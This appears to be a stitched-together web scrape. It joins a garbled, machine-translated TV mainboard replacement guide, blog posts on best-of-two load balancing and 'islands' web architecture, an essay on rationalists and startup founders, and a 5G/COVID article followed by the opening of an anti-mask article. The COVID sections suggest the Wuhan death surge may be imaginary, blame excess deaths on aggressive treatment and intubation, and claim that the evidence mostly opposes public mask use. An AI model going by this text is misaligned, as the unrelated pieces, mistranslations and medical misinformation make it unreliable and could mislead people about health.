In fact, the universal mine can eatfrom 5 volts. 12 V is only used when a 12-volt matrix is ​​connected to it. Next are stabilizers 5V, 3.3V and 1.8V, which feeds the processor board. So, the lane can be powered from 5V in case the matrix supply voltage is 5 or 3.3 V. Here, only the lane does not have a connector for connecting to 5 Volt directly. It is necessary to solder the supply wiring to the electrolytic capacitor, which stands after the 5V - stabilizer (on this board it is ECW53).<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15389.jpg"><br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15391.jpg"><br>
We are convinced of the performance of this design (the blue LED is on, responds to the commands of the console).<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15394.jpg"><br>
However, now it is not possible to power the 12-voltlane matrix. Therefore, we connect the matrix to the output 12V of the power supply. After all, as you know, these same 12V will appear only after the activation signal from the mine. This is just what you need.<br>
We unsolder the power supply wires from the lane (connect to pin 1 and 2) and solder to the connector of the power supply.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15395.jpg"><br>
This matrix power supply has anotheradvantage. As indicated above, the current flowing through the matrix is ​​about 1A. Which is too much for a tiny SMD transistor on the lane that opens up power to it. He withstood the first few inclusions, but who knows how much is enough for him. (I read about this issue somewhere on the forums, as an option - to replace the transistor on the universal lane with a more powerful one). <br>
The overall power scheme of the TV looks like this:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15397.png"><br>
Voltage 5V is constantly supplied to the main-board,when switched on, the BLON + 5V signal comes from the duty mode from the lane to the power supply unit, which opens the + 12V supply to the matrix and + 24V to the backlight. And here there was another snag.<br>
The fact is that the power supply has an on signalSTBY is inverse, that is, the power of the backlight and the matrix appears after the pin of STBY closes to ground. Here is the section of the power supply circuit that is responsible for this signal.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15399.png"><br>
When a low level signal is applied to the STBY pin(when it is shorted to ground), the T101 transistor opens, power is supplied to the LED of the optocoupler U101, which starts the PWMs that form 12 and 24 V. If you send + 5V from the lane to STBY, nothing will happen, the transistor will not open. So, it is necessary to modify the circuit so that the LED of the optocoupler lights up when a high level signal is applied from the lane. To do this, I added another key on the npn transistor, and the scheme began to look like this:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15401.png"><br>
The key connects to the gap between pin 2optocouplers and ground. In this case, the base of the transistor U101 closes to ground. Thus, T101 is constantly open, and KT503 opens when a high level signal (+ 5V) is applied to its base, lighting the LED of the optocoupler. You can use any npn transistor, and calculate the divider so that the voltage between the base and the emitter is at least 2 times lower than the limit on the datasheet. With two identical resistors, it turns out to be +2.5 V. The key is assembled on a small board and glued to hot-melt adhesive on the power supply.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15402.jpg"><br>
Now, you can put everything together in a package.tv set The power supply unit has risen to a regular place. For the universal lane I marked out holes on the metal substrate on which the old mine-board was located, and secured the stands.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15405.jpg"><br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15407.jpg"><br>
A board with an IR receiver and a LED from anotherI fixed the TV on a hot-melt glue, the distances between the windows for them coincided, and there were too many active elements on the motherboard, and I didn’t want to mess around with the wiring. The buttons are left native, but since they are paralleled, all 6 buttons are connected to pin 6, that is, you can turn on or off any of these 6 buttons in standby mode. <br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15410.jpg"><br>
View of the TV assembly without the back cover:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15413.jpg"><br>
On the back cover did not make any cuts, onlyremoved the metal casing covering the lane from the side of the connectors and from above, to access the side AV connectors. The board turned out to be slightly recessed inside the case, all because of the short LVDS cable, but this does not interfere with access to the inputs.<br>

We turn on, and first of all we turn on autotune of channels. You can configure analog and digital TV separately, and select the desired region.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15421.jpg"><br>
Autotune goes for a long time, about 10 minutes. A dozen kilometers from the TV tower to the active antenna were found all the analog and digital channels that are available. <br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15422.jpg"><br>
The quality of digital images, of course, does not compare with the analog, although all digital channels broadcast in 576r.<br>

<p>Using less information to make better decisions.</p>


<p>In many large-scale web services, multiple layers of stateless and stateful services are seperated by load balancers. Load balancing can be done with dedicated hardware, with dedicated software load balancers, using DNS trickery or through a load-balancing mechanism in the client. In large systems, the resources and constraints at each layer can vary widely. Some layers are stateless, and easily scale horizontally to many machines. Other layers may be more constrained, either due to the need to access state or contention for some other shared resource.</p>

<p>Centralized load balancing solutions can distribute load over a fleet of machines very well. They track the amount of load they are sending to each machine (usually based on a simple measurement like connection count). Because they are centralized, load balancers typically don't need to worry about load sent from other sources. They have complete control over the distribution of load.</p>

<p>Despite this advantage, dediced load balancers are often undesirable. They add cost, latency, complexity, and may introduce a single point of failure. Handing the task of load balancing to each upstream client is also possible, but introduces the challenge of fairly balancing the load from multiple places. In large systems with large numbers of clients and fairly homogeneous calls, a purely random system like DNS round robin can work very well. In smaller systems, systems where each downstream service can only handle a small number or concurrent requests, and systems where requests are heterogeneous it's often desirable to load balance better than random.</p>

<p>Perfect distributed load balancing could be done, at least in the happy case, by distributing information about system load across all the clients. The overhead of constantly sharing the exact load information between different sources can be high, so it's tempting to have each source work off a cached copy. This data can periodically be refreshed from downstream, or from other clients.</p>

<p>It turns out that's not a great idea.</p>

<p>In <a href="http://www.eecs.harvard.edu/~michaelm/postscripts/handbook2001.pdf">The Power of Two Random Choices: A Survey of Techniques and Results</a>, Mitzenmacher et. al. survey some research very relevant to this problem. The entire survey is good reading, but one of the most interesting results is about the effects of delayed data (like the cached load results mentioned above) on load balancing. The results are fairly logical in retrospect, but probably don't match most engineers' first expectations.</p>

<p>Using stale data for load balancing leads to a herd behavior, where requests will herd toward a previously quiet host for much longer than it takes to make that host very busy indeed. The next refresh of the cached load data will put the server high up the load list, and it will become quiet again. Then busy again as the next herd sees that it's quiet. Busy. Quiet. Busy. Quiet. And so on.</p>

<p>One possible solution would be to give up on load balancing entirely, and just pick a host at random. Depending on the load factor, that can be a good approach. With many typical loads, though, picking a random host degrades latency and reduces throughput by wasting resources on servers which end up unlucky and quiet.</p>

<p>The approach taken by the studies surveyed by Mitzenmacher is to try two hosts, and pick the one with the least load. This can be done directly (by querying the hosts) but also works surprisingly well on cached load data.</p>

<p>To illustrate how well this works, I ran a simulation of a very simplistic system. Every second one request arrives at a system with 10 servers. Every 8 seconds the oldest request (if any) is removed from the queue on the servers. Load balancing is done with a cached copy of the server queue lengths, updated every N seconds. I considered four approaches: chose a random server, chose the best server, best of two random choices and best of three random choices.</p>

<p><img src="https://s3.amazonaws.com/mbrooker-blog-images/mbrooker_best_of_two_result.png" alt=""></p>

<p>As you can expect, the <em>pick the best</em> approach worked best when perfect undelayed information was available. In the same case, the random pick approach worked poorly, leading to the worst queue times of any of the approaches. As the age of the data increases, the <em>pick the best</em> approach becomes worse and worse because of herding and soon overtakes the random approach as the worst one.</p>

<p><em>Best of 3</em> starts in second place, and puts in a good performance. It gains first place, only to cede it to <em>best of 2</em> as the delay increases. Clearly, the behavior for <em>best of k</em> will approach the behavior of <em>best</em> as k approaches the number of servers. <em>Best of 2</em> remains the strong leader all the way to the end of this simulation. Given these parameters it would start losing to the random approach around a refresh interval of 70. It is the clear leader for intervals over the range from 10 to 70, which is an impressive performance for such a simple approach.</p>

<p><em>Best of 2</em> is good because it combines the best of both worlds: it uses real information about load to pick a host (unlike random), but rejects herd behavior much more strongly than the other two approaches.</p>

<p>Take a look at <a href="http://www.eecs.harvard.edu/~michaelm/postscripts/handbook2001.pdf">The Power of Two Random Choices</a> for a much stronger mathematical argument, and some more surprising places this algorithm works really well.</p>

        <section>
            <p><img src="https://res.cloudinary.com/wedding-website/image/upload/c_scale,w_2400/v1597095361/krzysztof-grech-6orUY98fw9s-unsplash_r6wjnf.jpg"></p>



<p>I’ve struggled to find references to this online, but heard the name used multiple times this year when describing the approach outlined here.</p>

<p>The general idea of an “Islands” architecture is deceptively simple: render HTML pages on the server, and inject placeholders or slots around highly dynamic regions. These placeholders/slots contain the server-rendered HTML output from their corresponding widget. They denote regions that can then be "hydrated" on the client into small self-contained widgets, reusing their server-rendered initial HTML.</p>

<p>You can think of this like a static HTML document that contains multiple separate embedded applications:</p>

<p>  
<img width="600" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-1.png">  
</p>

<p>This may seem similar to "micro-frontends" at first glance. Both approaches share the idea of breaking applications up into independent units, however "micro-frontends" do not typically imply that composition of those units is achieved using HTML.</p>

<p>A closer analog to the "islands" approach would be progressive enhancement, to which we're essentially adding SSR hydration and a consistent metaphor for adding interactivity to a region of the page. In traditional progressive enhancement, we might have a <code>&lt;script&gt;</code> that looks for an image carousel in the page and instantiates a jQuery plugin on it. Instead, that image carousel would be rendered on the server and a dedicated <code>&lt;script&gt;</code> emitted for it that loads the image carousel implementation and in-place upgrades it to be interactive.</p>

<h3 id="whydoesthismatter">Why does this matter?</h3>

<p>As it turns out, there are a number of benefits to the group of approaches described here when compared to typical Single Page Application architectures.</p>

<h5 id="progressivehydrationforfree">"Progressive Hydration" for free</h5>

<p>I’ve touted the performance benefits of <a href="https://www.youtube.com/watch?v=k-A2VfuUROg">Progressive Hydration</a> techniques for frameworks like React, Angular, Preact and Vue. With these architectures, individual widgets on a page are loaded and initialized over time. This can be done using a simple scheduling approach via requestIdleCallback, or can take additional factors into account like viewport visibility, interaction likelihood, product value, etc.</p>

<p>Similar to Progressive Hydration, rendering pages using an islands architecture results in the heavier dynamic portions of the page being initialized not just progressively, but <em>separately</em>. This means individual regions of the page become interactive without anything else on the page needing to be loaded first.</p>

<p>Unlike Progressive Hydration, the approaches that fall out of building around an islands architecture do not require top-down rendering. This is a distinct advantage, since there are no outer “root” components that must be initialized before their descendants. Each part of the page is an isolated unit, and a performance issue in one unit doesn't affect the others.</p>

<h5 id="seoanduxarentatradeoff">SEO and UX aren’t a tradeoff</h5>

<p>The status quo for SSR as used by Single Page Applications is that it’s often cited as a necessity for SEO reasons. However, SSR can actually have a net <em>negative</em> impact on User Experience - visitors are left waiting for the actual functionality of a page to arrive while staring at a frustratingly fake version of that page.</p>

<p>Many applications also suffer from silent SSR performance pitfalls without realizing it. In virtual DOM libraries, it's easy (and common) to accidentally construct a situation where first render destroys the server-rendered HTML DOM, only to recreate it again from scratch (often synchronously). This is the result of some common misconceptions, which may stem from documentation giving an idealized view of hydration while passing over tricky caveats and footguns.</p>

<p>Even in cases where SSR hydration is functioning as designed, the status quo leaves a lot to be desired. The amount of JavaScript work being performed during page load is still many orders of magnitude more than what might be considered "efficient".</p>

<p>In an "islands" model, server rendering is not a bolt-on optimization aimed at improving SEO or UX. Instead, it is a fundamental part of how pages are delivered to the browser. The HTML returned in response to navigation contains a meaningful and immediately renderable representation of the content the user requested.</p>

<p>Sections of that HTML may be missing their client-side interactivity, but the document should at least contain the most essential content. For example: a news page’s HTML would contain the article body, and a product page would contain that product’s description.</p>

<p>All of the other content is secondary to this information, and its inclusion in the HTML becomes a product decision. How vital is this bit of information to a user visiting the page? How important is that widget to the business model? A "buy now" button that directly relates to revenue should be easily prioritized over a site feedback survey button that relates to information gathering.</p>

<h5 id="betterforaccessibilityanddiscoverability">Better for accessibility and discoverability</h5>

<p>A website that uses standard HTML links for navigation is easier for assistive technologies and web crawlers to use. This is true regardless of whether links or forms are intercepted by JavaScript and rerouted to client-side logic, because the underlying assumptions remain true: clicking a link navigates to the given page.</p>

<p>Anecdotally, think of the number of times you’ve been sent a “link” to what the sender assumed was the page they were viewing, only to realize the link contained none of the necessary information:</p>

</p>

<p>Building page-based applications doesn't completely prevent these types of strange experiences, it only makes the decision to do so more direct. It makes the default outcome the accessible one.</p>

<hr>

<p>When it comes down to it, shipping an architecture that requires less code to do something is the type of long-term benefit your future self (or coworkers) will thank you for. It's possible — likely, even — that adopting a model like this requires more up-front design thinking. There are far few batteries-included options available for decomposing apps into independently deliverable widgets. Who knows, maybe we can fix that.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
       <p>In response to <a href="https://applieddivinitystudies.com/2020/09/05/rationality-winning/">Where are all the Successful Rationalists</a>, <a target="_blank" rel="noopener" href="https://forum.effectivealtruism.org/posts/MTqWL53brYhnGiAJN/link-where-are-all-the-successful-rationalists">Robert Wiblin writes</a>:<br><em>The EA community seems to have a lot of very successful people by normal social standards, pursuing earning to give, research, politics and more… Typically they aren’t yet at the top of their fields but that’s unsurprising as most are 25-35.</em></p>
<p>He’s basically right. On the <a target="_blank" rel="noopener" href="https://slatestarcodex.com/2019/01/13/ssc-survey-results-2019/">SSC 2019 survey</a>, the median reader was 30. [1]</p>
<p>So Wiblin’s right, but his comment begs a much more important question: <strong>why do rationalists think being young is incompatible with being at the top of your field?</strong></p>
<p>Take for example, <a target="_blank" rel="noopener" href="https://bioeng.berkeley.edu/faculty/patrick-hsu">Patrick Hsu</a>. He’s 29, an assistant professor at Berkeley, and <a target="_blank" rel="noopener" href="https://scholar.google.com/citations?user=LhnU_joAAAAJ&amp;hl=en&amp;oi=ao">has his name on several seminal CRISPR papers</a>. He <a target="_blank" rel="noopener" href="https://twitter.com/pdhsu/status/1162410158443511808">reads and endorses Alexey Guzey</a> so he’s clearly into weird blogs on the internet. It’s not unreasonable to think that people like this should be part of the rationality community.</p>
<p>Or to take a more visible case, consider all the very young startup founders.</p>
<p><a target="_blank" rel="noopener" href="https://www.briantimar.com/notes/founders/">Brian Timar</a> looked at the companies he’s interested in, and found that the average and median age at founding was 30. If you scan <a target="_blank" rel="noopener" href="https://www.ycombinator.com/topcompanies/">YC’s top 100 companies</a>, many of the founders were under 35 when they started:</p>
<p><img src="https://applieddivinitystudies.com/images/age-at-founding.png"></p><p>92% of founders were under 30 when they started their companies, mean and median age were both 26.</p>
<p>But okay, we might not expect to know about founders who are just getting started. You’re not successful until your company actually succeeds. So how old are those same founders now? Still pretty young.</p>
<p><img src="https://applieddivinitystudies.com/images/current-age.png"></p><p>46% are still under 35, and 85% are under 40. Mean is 36, median is 35.</p>
<p>Data for both charts <a target="_blank" rel="noopener" href="https://docs.google.com/spreadsheets/d/1FeDDGo_SWeDMMZlTrJ_P2TifyJoOqAuOD8klBKQpUdA/edit?usp=sharing">here</a>.</p>
<p>Granting Wiblin’s point about youth, I’ll ask again: where are all the successful rationalists?</p>
<hr>
<p>It gets a lot worse when you consider that ideologically, rationalists should be uniquely well positioned to start a company.</p>
<p><strong>Linear Returns from Wealth</strong><br>For a normal person, the expected financial value of a startup may be high, but the expected returns to personal happiness are very low. A billion dollars will probably only make you a little bit happier than million, so it makes sense to be risk averse and keep your day job. <strong>But for a rationalist utilitarian, returns from wealth are perfectly linear! Every dollar you earn is another dollar you can give to prevent Malaria.</strong> So when it comes to earning, rationalists ought to be risk-neutral, and skew more heavily than normal people towards starting companies.</p>
<p><strong>Willingness to be Weird and Lame</strong><br><a target="_blank" rel="noopener" href="http://paulgraham.com/early.html">Paul Graham says</a> “One of the biggest things holding people back from doing great work is the fear of making something lame.” Meanwhile, rationalists totally disregard this tendency to spend years working on things no one else cares about. Will MacAskill has been <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=MP4WryyGMlE&amp;t=5m10s">speaking for years</a> on the importance of keeping EA weird, but even before that there was a decade of posts about nootropics, longevity and superintelligence, long before it was cool.</p>
<p>Another <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=oJDlzvqrPLk&amp;t=14m10s">panel</a> from back in 2009: “I think we can fairly say that we’re all, Peter maybe less so, not afraid to being weird”</p>
<p><strong>Low Probability High Return Bets</strong><br>Rationalists are also already into doing things with a tiny probability of huge impact, as described in <a target="_blank" rel="noopener" href="https://www.openphilanthropy.org/blog/hits-based-giving">OpenPhil’s Hits-based Giving</a>. This is the entire justification for caring about this like AI Safety. You multiply out the probabilities, and preventing even a 1-in-a-thousand chance of extinction turns out to be a very effective use of time.</p>
<p><strong>Slant Towards Tech</strong><br>Many rationalists are in the UK, but today the epicenter skews more towards the Bay Area. <a href="https://applieddivinitystudies.com/2020/09/05/rationality-winning/">As I wrote last time</a>, 40% work in software engineering, so they should be relatively well poised to start companies.</p>
<p>So seriously, where are all the successful rationalists?</p>
<hr>
<p>Many qualities are ascribed to startup founders. Visionary, optimist, contrarian, workaholic.</p>
<p>What you don’t hear is founders praised for their intellectual honesty.</p>
<p>That shouldn’t come as a surprise. It’s no secret that you need a kind of unreasonable self-confidence to pitch VCs. Less discussed but analogous is the process of recruiting early employees. It is not very compelling to offer: “Come work for me, if we’re incredibly lucky there’s a miniscule chance you’ll get .1% of a billion dollar company which comes out to $500 thousand after dilution, $250 thousand after tax, over 4 years, minus the strike price.”</p>
<p>Alex Danco asks <a target="_blank" rel="noopener" href="https://alexdanco.com/2020/09/17/are-founders-allowed-to-lie/">Are Founders Allowed to Lie</a>. It’s a good piece and you should read it, but the fact that he even has to ask means it’s possible the answer is “yes”, which is just not something any normal industry says about its leaders.</p>
<p>The easiest explanation is that founders really are just consciously manipulative, but I worry we’re underestimating how hard that would be. It takes enormous energy to maintain a lie, and tremendous sociopathy to do so consciously. From what I can tell, a lot of these founders are actually disproportionately philanthropic. I can’t rule out that this is just a PR move or whatever, but this whole idea just feels somewhat extreme and conspiratorial.</p>
<p>So okay, maybe it’s unconscious? Maybe founders are uniquely out of touch with reality and genuinely believe that they’re very likely to beat the overwhelming odds against them?</p>
<p>Again, this doesn’t feel right. Sure, you have to be optimistic, but you can’t be straight up delusional and continue to function at a very high level. Kara Swisher and Elon have a <a target="_blank" rel="noopener" href="https://www.vox.com/2018/11/2/18053424/elon-musk-tesla-spacex-boring-company-self-driving-cars-saudi-twitter-kara-swisher-decode-podcast">great exchange</a> about this, maybe my favorite moment in any interview ever:</p>
<blockquote>
<p><strong>[KS:] What about things that are just critical of you that you don’t like? Do you think you’re particularly sensitive?</strong></p>
<p>[EM:] No. Of course not. Count how many negative articles there are and how many I respond to. One percent, maybe. But the common rebuttal of journalists is, “Oh. My article’s fine. He’s just thin-skinned.” No, your article is false and you don’t want to admit it.</p>
<p><strong>Do you take criticism to heart correctly?</strong></p>
<p>Yes.</p>
<p><strong>Give me an example of something if you could.</strong></p>
<p>How do you think rockets get to orbit?</p>
<p><strong>That’s a fair point.</strong></p>
<p>Not easily. Physics is very demanding. If you get it wrong, the rocket will blow up. Cars are very demanding. If you get it wrong, a car won’t work. Truth in engineering and science is extremely important.</p>
<p><strong>Right. And therefore?</strong></p>
<p>I have a strong interest in the truth.</p>
</blockquote>
<hr>
<p>If founders aren’t liars or delusional, what could explain their seemingly irrational optimism?</p>
<p>Rather than general dishonesty, my theory is that founders neglect one kind of reasoning very specifically. The same kind most rationalists are obsessed with: taking the outside view.</p>
<p>I’m using “outside view” as a kind of general term for meta-level thinking, consulting base rates, or using <a target="_blank" rel="noopener" href="https://slatestarcodex.com/2013/08/06/on-first-looking-into-chapmans-pop-bayesianism/">bayesian epistemology</a>. Basically, it means not trusting your first-order estimates too much, looking around to see whether or not those estimates are justified, and reasoning “from behind the veil”. As <a target="_blank" rel="noopener" href="https://equilibriabook.com/">Inadequate Equilibria</a> describes it:</p>
<blockquote>
<p>Modest epistemology doesn’t need to reflect a skepticism about causal models as such. It can manifest instead as a wariness about putting weight down on one’s own causal models, as opposed to others’….</p>
<p>If we were fully rational (and fully honest), then we would always eventually reach consensus on questions of fact. To become more rational, then, shouldn’t we set aside our claims to special knowledge or insight and modestly profess that, really, we’re all in the same boat? [2]</p>
</blockquote>
<p>Here’s a more concrete example: A rationalist has a good startup idea, so they set out to calculate expected value. YC’s acceptance rate is something like 1%, and even within YC companies, only 1% of them will ever be worth $1 billion. So your odds of actually having an exit of that magnitude are 10,000 to 1, and then you’re diluted down to 10% ownership and taxed at around 50%. Of course, there are exits under and above a billion, but back-of-the-napkin, you’re looking at an expected $5,000 for 10+ years of work so grueling that even successful founders describe it as “<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=yZlHbjxtECg">eating glass and staring at the abyss</a>“. [3]</p>
<p>This is so deeply ingrained in my head as the rational way to think, that it took me a long time to realize that other people just fundamentally don’t approach problems this way. I would venture to guess that the normal train of thought is closer to: “Most startups fail, but that’s because their ideas are bad. Since my idea is very good, I’ll neglect the base rates. I am very special.”</p>
<p>Does that sound mean? It shouldn’t. There’s nothing wrong with thinking that you’re special. It’s not a moral belief, or a claim to entitlement. It’s just the understanding that you are not a median member of the general population, so base rates about “anyone who has ever applied to YC” don’t apply.</p>
<p>The rationalist sees the 1% acceptance rate and gets intimidated. Normal people see that <a target="_blank" rel="noopener" href="https://www.ycombinator.com/faq/#q17">applying to YC</a> <a target="_blank" rel="noopener" href="https://blog.ycombinator.com/common-misconceptions-about-applying-to-yc/">explicitly</a> does not require a business plan, incorporation, existing revenue, or an introduction, and understand that any idiot with a couple hours can will out a web form. Accordingly, they totally ignore the base rate.</p>
<p>That’s all the acceptance part of starting a company, but much more important is actually coming up with an idea you believe in. Rationalists tend to accept the Efficient Markets Hypothesis. They look at an industry, think “what are the odds I know more than people who have done this for a decade?” and assume any seeming inefficiencies are just a <a target="_blank" rel="noopener" href="https://wiki.lesswrong.com/wiki/Chesterton%27s_Fence">Chesterton’s Fence</a>.</p>
<p>That’s not what normal people do at all. Normal people look at an industry, they see a gross inefficiency staring at them in the face, and they think “wow, that’s grossly inefficient!”</p>
<p>And then sometimes, they even set out to solve it.</p>
<hr>
<p>[1] If the median rationalist is now 30, and Yudkowsky started writing in 2007, was his audience mostly teenagers?</p>
<p>[2] I’m not exaggerating. In fact, this is a massive oversimplification of the <a target="_blank" rel="noopener" href="https://www.getguesstimate.com/models/316">estimates of startup success</a> rationalists actually put together.</p>
<p>[3] To be fair, Yudkowsky is specifically attempting to correct against modest epistemology, concluding with an exhortation to not take the outside view so much and instead “spend most of …</p></div></div>

<p>David Crowe<br>Version 3<br>April 24, 2020</p>
<p>
I am a wireless telecom consultant, and have been since 1992. If you want, you can believe that the fact that my income comes from the wireless industry disqualifies me from commenting. Or perhaps, that my expertise is helpful. I have no financial relationship with any company making 5G equipment, although in full disclosure, I was engaged as an expert witness by Huawei around 2011, but that was before much 4G equipment was available, and 5G was still a dream. And an expert witness is ideally not an exponent of the position of a company, and I like to believe I am an ideal expert witness.

</p><h2>5G is Not a Well Defined Concept</h2>
<p>
5G is a set of goals defined by the ITU, not a specific technology. The most obvious goal is that wireless devices should be able to receive data at the fantastic speed of 1Gbps or even higher. This can be achieved by satellites, large towers, or tiny little boxes sitting on the ceiling of an office, or on the wall of a building outside. There are a wide range of frequencies being planned for use although it is true that a lot of 5G systems are planning to use higher frequencies than 4G.

</p><h2>Confusing 5G with GHz and Gbps</h2>
<p>
A lot of critics of 5G seem to be terribly confused by the letter G. Is this the fault of telecom engineers who over-used the letter, or of the critics who couldn’t be bothered to spend an hour researching and writing down the definitions? Let’s straighten that out now:
</p><ul>
<li>The “G” in 5G stands for “Generation”. 1G was analog communications, 2G was early digital with SMS but no data, 3G provided the first data systems, 4G provided a data-only system, with voice treated as just one type of data, and 5G will provide even higher speeds and other advantages.
</li><li>The “G” in GHz stands for one billion (Giga) and references the frequency of the communications. Cellular communications started at 400-900 MHz (Mega = one million) in the 1980s, or just under 1GHz. PCS in the 1990s moved communications up to 2GHz. Some 4G communications are at frequencies as high as 3.5GHz, and 5G is talking about going up to 60GHz. But a lot is still just talk.
</li><li>The “G” in Gbps also stands for one billion, but this is referencing data speed. In the days of modems people talked about kbps (thousands of bits per second). With DSL and ethernet, Mbps (millions of bits per seconds), and now we are in the realm of Gbps (billions of bits per seconds).
</li></ul>

<h2>Explaining What Does Not Need to Be Explained</h2>
<p>
5G in Wuhan is an explanation for a surge of deaths that might be imaginary. I have still seen no evidence that this city of 11 million people actually was experiencing a surge of deaths. First, bring the evidence that there was a dramatic increase, otherwise there is nothing that needs to be explained by 5G or any other theory about the root cause.

</p><h2>Other Explanations for Increased Deaths</h2>
<p>
It has become clear that in Italy and in other parts of Europe, there is an increase in death rates. We know this because the Europeans provide near real-time mortality statistics. But there are other explanations than 5G or the virus, such as:
</p><ul>
<li>Just as with SARS, doctors are aggressively treating people on the basis of the positive test, including intubation, steroids, antiviral drugs, and other unproven medications. We will likely find evidence of serious harm afterwards.
</li><li>Doctors are intubating people because of fear of infection via leaky oxygen masks. This is really malpractice, treating the patient for the benefit of the medical staff, rather than for the benefit of the patient. And the fear was found to be unfounded with SARS.
</li><li>Isolating old, frail people from their family, and even from nurses, who are now hidden behind PPE, is likely to hasten their demise.
</li><li>People are being told to stay away from the ER, or are deciding for themselves, based on fear of the virus. So, when some people do get really sick, they will show up at the hospital in much worse shape, and may even die unnecessarily.
</li><li>Lombardy in Italy, their epicentre, is one of the most polluted parts of Europe. This problem also occurs in Wuhan. Air pollution is not a constant, but gets better and worse as weather conditions change. And an increase in air pollution could explain some deaths.
</li><li>Patients whose deaths were blamed on COVID-19, particularly in Italy, are extremely old (average age 80) and infirm. Of the first 2,003 deaths examined almost half had 3 or more pre-existing health conditions and only 3 deaths were in people with none. China, with a much younger population, also shows above average ages for those diagnosed with illness and, particularly, with deaths. They are the most vulnerable to increases in air pollution and aggressive treatment.
</li><li>Most people who were very sick or died had one or more pre-existing health conditions. Almost half of the first 2,003 deaths in Italy had 3 or more pre-existing health conditions. The average number in the UK was 2.7. In New York, a survey of 5700 hospitalized COVID-19 patients showed that 89% had two or more pre-existing health conditions.
</li></ul>

<h2>What is EMF?</h2>
<p>
Electro-magnetic fields, or electro-magnetic radiation, are vibrations that naturally occur at a wide variety of frequencies. The highest frequency (most rapid vibrations) are Gamma Rays, followed by X Rays, Ultraviolet light, the visible light spectrum from violet down to red, and then the radio or microwave spectrum. Clearly the greatest damage comes from the highest frequencies, and radio and microwave have the lowest frequencies, so on this basis, should have the lowest impact. Even visible light has much higher frequencies than radio waves, and we are bathed in it all the time, although with enough energy, that too can be damaging as any sunburned person can attest (although most of the damage probably comes from the invisible ultraviolet).
</p><p>
Energy of EMF is also found in the amplitude of the wave (how high the wave is as opposed to how far apart the peaks are). It is true that even radio/microwaves can have a lot of energy with high amplitude waves. This means that a microwave oven, operating at high power, would cause massive damage to the human body (which is why it shuts off automatically when the door is opened). By comparison, cellphones operate at a tiny fraction, usually 1/10,000th or 1/100,000th of the energy of a microwave oven.
</p><p>
So, any EMF can be damaging if the amount of energy in the wave is high enough.

</p><h2>Is EMF Radiation?</h2>
<p>
Radiation is usually thought of as the damaging types of radiation coming from nuclear bombs, power plants or nuclear waste. This is more properly called ionizing radiation. Radiation itself just means any energy, whether waves like EMF, or energetic particles, that travels through space. Generally it spreads out with distance, hence the name radiation.
</p><p>
The highest frequency forms of EMF, Gamma Rays and X Rays, are ionizing, and thus can permanently alter atoms by removing electrons. Lower frequency forms, from Ultraviolet down to radio waves, cannot do this.

</p><h2>Can Microwave Emissions Cook Your Brain?</h2>
<p>
Almost the entire range of wireless communications that we are familiar with – cellular, WiFi, 3G, 4G, 5G, PCS, LTE, GSM – falls into the microwave range, which extends from 300 MHz (0.3GHz) to 300 GHz. But to conclude from this that our brains are going to be fried or, rather, microwaved, is an absurdity.
</p><p>
Modern wireless devices usually transmit at less than 1 Watt of power, whereas microwave ovens operate at 600-1200 Watts. Not only that, but wireless communications tries to minimize transmit power. A recent paper found that wireless devices in rural areas generally operated at about 2% of peak power, and in more urban areas at about 1%. In terms of watts, 0.01 to 0.02 watts. Network transmitters (towers) transmit at higher power, but the power level is calculated so that what is received by your phone (and therefore may be absorbed by your body) is at the lowest power level that will provide error free communication.
</p><p>
The main reason for wireless devices to use the lowest possible power may be surprising. Obviously the power bill of the phone companies is reduced if they transmit to devices at the lowest feasible power. And the battery life of your phone, is only as good as it is, because of tight power management. But the real reason is interference. If there are many devices simultaneously transmitting, using the lowest possible power (i.e. the lowest that allows communications without excessive errors that could garble transmissions) then you have less interference between communications, and can get more users on the system, and therefore make more money.
</p><p>
To say that long exposure to power levels that are thousands of times lower than a microwave oven will eventually cook your brain, is like saying that a cook in a restaurant, who can feel the heat (infrared EMF) from an oven while working, will eventually get cooked by that oven. It is an absurdity. This is not to say that there should be no precautions for engineers and technicians who work in high RF emission environments, nor that 5G antennas should be arranged without minimizing human exposure, nor that government regulators should not limit the maximum power of devices that will be close to the human head. There are also concerns with certain high frequencies resonating with functions in the human body. This is also worth investigating.

</p><h2>5G Cannot Explain Patterns of Death</h2>
<p>
5G is currently in the early stages, and there are only relatively small installations. At the higher frequencies the radius of transmission of one cell is quite small, measured in tens or hundreds of meters (yards) rather than in kilometers or miles, as for a standard cellular tower. This means that 5G will cover dense pedestrian areas at first, then move into indoor applications, such as shopping malls. It will be a long time before higher frequencies covers highways, suburban areas and rural areas.

The people who are dying, supposedly from coronavirus, are …</p></div>

<p>
Masks are being widely recommended as protection against the COVID-19 virus, both to protect the wearer from infection, and to protect others from wearers who do not know that they are infected. Trouble is, most of the scientific evidence and recommendations are against the use of masks by the general public. Despite this they are increasingly mandated. In some places you cannot walk around outside without a mask, in others you cannot go inside a public space without a mask. Workers are often mandated to wear them. And now airline passengers, no matter the length of their flight.

</p><h2>Evidence for the use of Masks</h2>
<p>
The strongest evidence for the use of masks is a Cochrane Collaboration review. Seven studies from the era of SARS found that mask-wearing was highly effective in case-control studies, although this type of study is subject to bias because the control arm is simply a representative group, unlike in a placebo controlled trial (very difficult with masks). For example, if the cases are sicker than the controls, they may behave differently, including in wearing a mask.
</p><p>
